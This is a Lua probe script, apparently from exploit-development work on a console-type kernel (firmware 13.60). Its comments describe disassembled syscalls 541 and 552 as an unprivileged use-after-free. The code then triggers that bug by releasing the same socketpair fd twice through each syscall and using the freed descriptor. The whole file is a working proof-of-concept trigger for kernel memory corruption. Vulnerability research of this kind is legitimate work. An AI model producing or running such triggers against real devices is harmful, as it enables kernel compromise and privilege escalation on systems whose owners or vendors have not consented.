-- CRASH_CLASS: MODERATE
-- PROBE 800a: syscall 541 / 552 release an fd's object twice
--
-- 13.60 disassembly (GateMapA):
--   541 (narg 1): lookup(a1) in [proc+0xc48] with flags 0x110; the only gate is a valid fd.
--        On success it calls 0x8ad59e20(obj, 0x110); if bit 0 of the flag returns 1, otherwise
--        it decrements [obj+0x50] and frees the object when that reaches zero.
--   552 (narg 1): the mirror image with flags 0x120 and the refcount at [obj+0x54].
--
-- If either call decrements without removing the fd entry, calling it twice releases the same
-- object twice and the fd table still points at freed memory: a use-after-free reachable with
-- one argument and no privilege.
--
-- The probe builds its own socketpair so a mistake cannot take down stdout, checks the pair with
-- a write/read round trip, then releases each fd once and again, and finally uses the fd.

print("=== PROBE 800a: DOUBLE RELEASE OF AN FD OBJECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wb(addr, val)
    local ok = pcall(function() memory.write_byte(addr, val) end)
    return ok
end
local function A(v) return uint64(to_num(v)) end

local sc_socketpair = make_syscall(135)
local sc_write = make_syscall(4)
local sc_read = make_syscall(3)

local buf = memory.alloc(0x100)
for i = 0, 0xFC do safe_wb(buf + i, 0) end
safe_wb(buf, 0x41) safe_wb(buf + 1, 0x42) safe_wb(buf + 2, 0x43)

local function pair()
    local fds = memory.alloc(8)
    safe_wd(fds, 0xFFFFFFFF) safe_wd(fds + 4, 0xFFFFFFFF)
    local ok, rv = pcall(function() return sc_socketpair(A(1), A(1), A(0), A(fds), A(0), A(0)) end)
    local r = ok and to_num(rv) or -999
    return r, safe_rd(fds), safe_rd(fds + 4)
end
local function rd(fd)
    local ok, rv = pcall(function() return sc_read(A(fd), A(buf + 0x40), A(2), A(0), A(0), A(0)) end)
    return ok and to_num(rv) or -999
end
local function wr(fd)
    local ok, rv = pcall(function() return sc_write(A(fd), A(buf), A(2), A(0), A(0), A(0)) end)
    return ok and to_num(rv) or -999
end
local function rel541(fd)
    local ok, rv = pcall(function() return make_syscall(541)(A(fd), A(0), A(0), A(0), A(0), A(0)) end)
    return ok and to_num(rv) or -999
end
local function rel552(fd)
    local ok, rv = pcall(function() return make_syscall(552)(A(fd), A(0), A(0), A(0), A(0), A(0)) end)
    return ok and to_num(rv) or -999
end

print("[A] socketpair")
local rv, a, b = pair()
print(string.format("  rv=%d a=%s b=%s", rv, tostring(a), tostring(b)))
if not a or not b or a < 0 or b < 0 then
    print("  no pair, stopping")
    return
end

print("")
print("[B] baseline round trip")
print(string.format("  write(a)=%d read(b)=%d", wr(a), rd(b)))

print("")
print("[C] 541 on the pair")
print(string.format("  rel541(a)=%d", rel541(a)))
print(string.format("  rel541(a) again=%d", rel541(a)))
print(string.format("  use a: write=%d", wr(a)))

print("")
print("[D] 552 on a fresh pair")
local _, c, d = pair()
print(string.format("  c=%s d=%s", tostring(c), tostring(d)))
if c and d and c >= 0 then
    print(string.format("  write(c)=%d read(d)=%d", wr(c), rd(d)))
    print(string.format("  rel552(c)=%d", rel552(c)))
    print(string.format("  rel552(c) again=%d", rel552(c)))
    print(string.format("  use c: write=%d", wr(c)))
end

print("")
print("[E] release bogus fds")
print(string.format("  rel541(0x7fff)=%d rel552(0x7fff)=%d", rel541(0x7fff), rel552(0x7fff)))
print(string.format("  rel541(0)=%d rel552(0)=%d", rel541(0), rel552(0)))

print("")
print("[F] alive")
